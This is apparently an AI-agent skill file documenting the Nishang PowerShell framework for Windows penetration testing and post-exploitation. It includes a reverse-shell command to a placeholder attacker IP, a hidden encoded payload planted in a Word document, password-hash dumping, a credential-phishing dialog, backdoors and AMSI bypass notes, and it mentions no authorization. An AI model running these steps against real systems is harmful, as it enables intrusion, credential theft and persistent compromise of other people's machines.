---
name: nishang
description: A framework and collection of PowerShell scripts and payloads for offensive security, penetration testing, and post-exploitation. Use when performing Windows post-exploitation, credential harvesting, privilege escalation, establishing reverse shells, or bypassing security controls on Windows targets.
---

# nishang

## Overview
Nishang is a comprehensive collection of PowerShell scripts and payloads designed for different stages of a penetration test, specifically targeting Windows environments. It covers everything from initial execution and shells to post-exploitation gathering and persistence. Category: Post-Exploitation / Web Application Testing.

## Installation (if not already installed)
Nishang is typically pre-installed on Kali Linux at `/usr/share/nishang`.

```bash
sudo apt update && sudo apt install nishang
```

## Common Workflows

### Loading Nishang in PowerShell
To use the scripts on a Windows target, you often need to import the module or dot-source individual scripts:
```powershell
Import-Module .\nishang.psm1
# Or dot-source a specific script
. .\Get-Information.ps1
```

### Creating a Reverse TCP Shell Payload
Generate a one-liner or script to get a reverse shell back to your listener:
```powershell
# On target, using a script from the Shells directory
Invoke-PowerShellTcp -Reverse -IPAddress <attacker-ip> -Port 4444
```

### Information Gathering
After gaining access, use the Gather scripts to enumerate the system:
```powershell
Get-Information
Get-PassHashes
```

### Executing Payloads via Client-Side Attacks
Nishang provides scripts to generate malicious files (like Excel or Word docs) that execute PowerShell:
```powershell
Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -ENCOD <base64_payload>"
```

## Complete Command Reference

Nishang is organized into functional directories. Each directory contains specific `.ps1` scripts.

### Directory Structure (/usr/share/nishang)

| Directory | Purpose |
|-----------|---------|
| `ActiveDirectory` | Scripts for AD enumeration and attacks. |
| `Antak-WebShell` | An ASPX webshell which utilizes PowerShell. |
| `Backdoors` | Scripts to provide persistent access to a target. |
| `Bypass` | Scripts to bypass UAC and other security controls. |
| `Client` | Scripts to generate payloads for client-side attacks (Office docs, LNK files, etc.). |
| `Escalation` | Scripts for local privilege escalation on the target. |
| `Execution` | Methods to execute scripts/commands on a target. |
| `Gather` | Scripts to extract information (passwords, hashes, system info). |
| `MITM` | Scripts for Man-in-the-Middle attacks. |
| `Pivot` | Scripts to pivot to other machines in the network. |
| `Prasadhak` | Tool for checking files against VirusTotal. |
| `Scan` | Scripts for network scanning and port discovery. |
| `Shells` | Various reverse and bind shells (TCP, UDP, HTTP, HTTPS). |
| `Utility` | General purpose utility scripts used by other Nishang scripts. |
| `powerpreter` | A post-exploitation module with multiple capabilities. |

### Key Scripts by Category (Partial List)

**Shells:**
- `Invoke-PowerShellTcp.ps1`: Interactive PowerShell reverse/bind shell.
- `Invoke-PowerShellWmi.ps1`: Interactive shell using WMI.
- `Invoke-PSGcat.ps1`: Reverse shell over Gmail.

**Gather:**
- `Get-PassHashes.ps1`: Dumps password hashes using the PowerSploit method.
- `Get-Information.ps1`: Comprehensive system information gathering.
- `Invoke-CredentialsPhish.ps1`: Pops a dialog to trick users into entering credentials.

**Escalation:**
- `Enable-DuplicateToken.ps1`: Token manipulation for escalation.

**Backdoors:**
- `HTTP-Backdoor.ps1`: Backdoor that uses HTTP for communication.
- `Add-ScritpRootkit.ps1`: Adds a rootkit to the profile or scripts.

## Notes
- **Execution Policy**: Most scripts require bypassing the PowerShell execution policy: `powershell.exe -ExecutionPolicy Bypass`.
- **AMSI**: Modern Windows systems have Antimalware Scan Interface (AMSI) which may block Nishang scripts. Bypassing AMSI is often a prerequisite.
- **Path**: On Kali, the scripts are located at `/usr/share/nishang/`. You must transfer the required script to the target or host it on a web server for the target to download.